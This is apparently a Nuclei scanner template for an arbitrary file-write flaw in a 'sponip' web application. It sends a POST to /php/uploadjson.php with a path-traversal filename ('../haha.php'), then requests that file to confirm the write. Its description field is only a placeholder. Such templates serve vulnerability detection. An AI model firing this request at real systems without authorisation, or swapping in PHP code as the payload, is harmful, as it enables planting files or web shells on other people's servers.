id: sponip-uploadjson-write
info:
  name: sponip-uploadjson-write
  author: apple
  severity: high
  description: description
  reference:
    - https://xz.aliyun.com/t/10737
  tags: sponip
http:
  - raw:
      - |
        POST /php/uploadjson.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type:application/x-www-form-urlencoded
        Content-Length: 51
        Origin: http://{{Hostname}}
        Connection: close
        Referer: http://{{Hostname}}/php/getjson.php
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0

        jsondata[filename]=../haha.php&jsondata[data]=123
      - |
        GET /haha.php HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        part: body
        words:
          - '123'
